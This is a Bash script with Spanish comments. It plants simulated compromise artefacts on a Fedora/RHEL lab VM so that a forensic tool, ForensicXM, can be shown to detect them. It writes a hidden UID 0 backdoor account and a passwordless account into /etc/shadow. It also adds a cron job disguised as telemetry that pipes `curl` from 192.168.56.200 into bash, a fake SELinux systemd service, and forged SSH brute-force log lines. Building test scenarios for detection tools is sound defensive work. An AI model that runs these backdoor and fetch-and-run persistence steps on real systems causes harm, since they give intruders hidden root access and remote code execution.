#!/bin/bash
# =============================================================
# Escenario VM5 - FEDORA / RHEL  (validación multi-distro)
# Módulos de ForensicXM probados: -u, -p, -l
#
# Objetivo metodológico: demostrar que ForensicXM funciona sobre
# una distribución NO basada en Debian. Esto valida:
#   - El fallback de logs en analyzer_logs.c:
#       auth.log (Debian)  ->  /var/log/secure (RHEL/Fedora)
#   - Que la lectura de /etc/passwd y /etc/shadow es agnóstica.
#   - Que la persistencia systemd en /etc/systemd/system es común.
#
# Diferencias frente a las VMs Ubuntu:
#   - El log de autenticación es /var/log/secure, NO auth.log.
#   - useradd se comporta igual, pero el grupo por defecto y
#     el shell pueden variar; lo forzamos explícitamente.
#   - SELinux puede estar activo: no afecta a las lecturas de
#     ForensicXM, pero conviene anotarlo en el informe.
#
# Ejecutar como root DENTRO de la VM Fedora. Snapshot previo.
# =============================================================
set -e
if [ "$EUID" -ne 0 ]; then echo "Ejecuta con sudo"; exit 1; fi

echo "[*] Infectando VM5 (Fedora / RHEL)..."

# --- 1. Backdoor: usuario con UID 0 oculto ---
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash -c "rhel support" rhsupport 2>/dev/null || true
# Hash MD5 débil ($1$) -> tu módulo lo marca DÉBIL igual que en Ubuntu
echo 'rhsupport:$1$xyz$Lk2s9Qw4pPq1nC8vJ5kZm0:19000:0:99999:7:::' >> /etc/shadow

# --- 2. Cuenta sin contraseña ---
useradd -M -s /bin/bash -c "patch agent" patchsvc 2>/dev/null || true
sed -i '/^patchsvc:/d' /etc/shadow
echo 'patchsvc::19000:0:99999:7:::' >> /etc/shadow

# --- 3. Persistencia vía cron (en Fedora: /etc/cron.d existe igual) ---
cat > /etc/cron.d/rhel-telemetry <<'EOF'
# Telemetria del sistema
* * * * * root curl -s http://192.168.56.200/rhpayload.sh | bash
EOF
chmod 644 /etc/cron.d/rhel-telemetry

# --- 4. Persistencia vía systemd (ruta idéntica a Ubuntu) ---
cat > /etc/systemd/system/selinux-helper.service <<'EOF'
[Unit]
Description=SELinux Helper Daemon

[Service]
Type=simple
ExecStart=/usr/bin/python3 -c "import os;os._exit(0)"
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# --- 5. Fuerza bruta SSH en /var/log/secure (NO auth.log) ---
# Esta es la prueba clave del fallback multi-distro.
SECURELOG=/var/log/secure
TS=$(date "+%b %e %H:%M:%S")
HOST=$(hostname)
for i in $(seq 1 20); do
  echo "$TS $HOST sshd[$((3000+i))]: Failed password for invalid user oracle from 192.168.56.77 port $((45000+i)) ssh2" >> $SECURELOG
done
for i in $(seq 1 8); do
  echo "$TS $HOST sshd[$((4000+i))]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.0.9" >> $SECURELOG
done
echo "[+] 28 eventos de fuerza bruta inyectados en $SECURELOG"

echo ""
echo "[+] VM5 (Fedora) infectada. Analiza con:"
echo "      sudo ./bin/forensicXM -u -p -l"
echo "      sudo ./bin/forensicXM -r reporte_vm5_fedora.txt"
echo ""
echo "[+] PUNTO CLAVE PARA EL INFORME: comprueba que el módulo -l"
echo "    encuentra /var/log/secure automáticamente (fallback desde"
echo "    auth.log). Eso valida el soporte multi-distribución."
